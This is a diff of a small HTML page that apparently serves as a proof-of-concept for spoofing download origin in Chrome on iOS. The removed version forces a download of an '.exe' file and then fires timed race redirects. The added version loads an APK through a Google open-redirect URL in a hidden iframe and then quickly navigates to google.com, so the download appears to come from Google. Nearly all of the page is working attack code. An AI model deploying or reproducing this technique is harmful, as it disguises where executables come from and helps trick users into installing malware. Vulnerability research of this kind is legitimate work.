@@ -18,72 +18,54 @@ body{
   font-size:18px;
   cursor:pointer;
 }
+
+#frame{
+  display:none;
+  width:0;
+  height:0;
+  border:0;
+}
 </style>
-
-<script>
-
-const FILE="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";
-
-function runTest(){
-
-  console.log("Triggering download");
-
-  startDownload();
-
-  // beberapa timing race window
-  const timings=[150,200,240,280,320,360];
-
-  timings.forEach((t)=>{
-    setTimeout(()=>{
-      redirectStep();
-    },t);
-  });
-
-}
-
-function startDownload(){
-
-  let a=document.createElement("a");
-  a.href=FILE;
-  a.download="chromeIOS.exe";
-
-  document.body.appendChild(a);
-
-  // trigger click setelah frame berikutnya
-  requestAnimationFrame(()=>{
-    a.click();
-    a.remove();
-  });
-
-}
-
-function redirectStep(){
-
-  console.log("Redirect sequence");
-
-  // tahap pertama
-  location.href="about:blank";
-
-  // tahap kedua
-  setTimeout(()=>{
-    location.replace("https://google.com");
-  },50);
-
-}
-
-</script>
 
 </head>
 
 <body>
 
-<h2>Chrome iOS Download Origin Test</h2>
+<h2>Chrome iOS Download Attribution Test</h2>
 
 <br>
 
-<button class="button" onclick="runTest()">
-Start Download Test
+<button class="button" onclick="startTest()">
+Click here
 </button>
+
+<iframe id="frame"></iframe>
+
+<script>
+
+function startTest(){
+
+  const frame=document.getElementById("frame");
+
+  // URL google redirect → file asli
+  const downloadURL="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk";
+
+  // trigger download lewat iframe
+  frame.src=downloadURL;
+
+  // tampilkan iframe setelah beberapa detik
+  setTimeout(()=>{
+    frame.style.display="block";
+  },3500);
+
+  // redirect cepat
+  setTimeout(()=>{
+    window.location.href="https://google.com";
+  },220);
+
+}
+
+</script>
 
 </body>
 </html>
